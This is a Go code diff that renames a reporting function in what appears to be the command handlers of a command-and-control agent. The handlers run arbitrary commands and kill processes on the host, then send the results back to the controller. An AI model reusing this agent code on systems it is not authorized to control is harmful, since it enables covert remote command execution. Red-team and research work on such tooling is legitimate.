@@ -39,11 +39,11 @@ func killCmdRun(cmd *cobra.Command, args []string) {
 		for _, pidStr := range pidStrs {
 			parsedPid, err := strconv.Atoi(pidStr)
 			if err != nil {
-				c2transport.C2RespPrintf(cmd, "Error: invalid PID '%s': %v", pidStr, err)
+				c2transport.NotifyC2(cmd, "Error: invalid PID '%s': %v", pidStr, err)
 				return
 			}
 			if parsedPid <= 0 {
-				c2transport.C2RespPrintf(cmd, "Error: invalid PID '%d': PID must be positive", parsedPid)
+				c2transport.NotifyC2(cmd, "Error: invalid PID '%d': PID must be positive", parsedPid)
 				return
 			}
 			pidsToKill = append(pidsToKill, parsedPid)
@@ -51,7 +51,7 @@ func killCmdRun(cmd *cobra.Command, args []string) {
 	}
 
 	if len(pidsToKill) == 0 {
-		c2transport.C2RespPrintf(cmd, "Error: no PID specified. Usage: kill <pid> [pid...] or kill --pid <pid>")
+		c2transport.NotifyC2(cmd, "Error: no PID specified. Usage: kill <pid> [pid...] or kill --pid <pid>")
 		return
 	}
 
@@ -97,14 +97,14 @@ func killCmdRun(cmd *cobra.Command, args []string) {
 	}
 
 	output := fmt.Sprintf("Kill operation result (%s):\n%s", status, strings.Join(results, "\n"))
-	c2transport.C2RespPrintf(cmd, "%s", output)
+	c2transport.NotifyC2(cmd, "%s", output)
 }
 
 // execCmdRun executes a command and returns its output.
 func execCmdRun(cmd *cobra.Command, args []string) {
 	cmdStr, _ := cmd.Flags().GetString("cmd")
 	if cmdStr == "" {
-		c2transport.C2RespPrintf(cmd, "exec: empty command")
+		c2transport.NotifyC2(cmd, "exec: empty command")
 		return
 	}
 	parsed := util.ParseCmd(cmdStr)
@@ -117,7 +117,7 @@ func execCmdRun(cmd *cobra.Command, args []string) {
 	execCmd.Stderr = &outBuf
 	err := execCmd.Start()
 	if err != nil {
-		c2transport.C2RespPrintf(cmd, "exec failed: %v", err)
+		c2transport.NotifyC2(cmd, "exec failed: %v", err)
 		return
 	}
 	// If not running in background, wait with a timeout.
@@ -132,8 +132,8 @@ func execCmdRun(cmd *cobra.Command, args []string) {
 			}
 		}()
 	} else {
-		c2transport.C2RespPrintf(cmd, "Command '%s' running in background, PID %d", cmdStr, execCmd.Process.Pid)
+		c2transport.NotifyC2(cmd, "Command '%s' running in background, PID %d", cmdStr, execCmd.Process.Pid)
 		return
 	}
-	c2transport.C2RespPrintf(cmd, "%s", outBuf.String())
+	c2transport.NotifyC2(cmd, "%s", outBuf.String())
 }
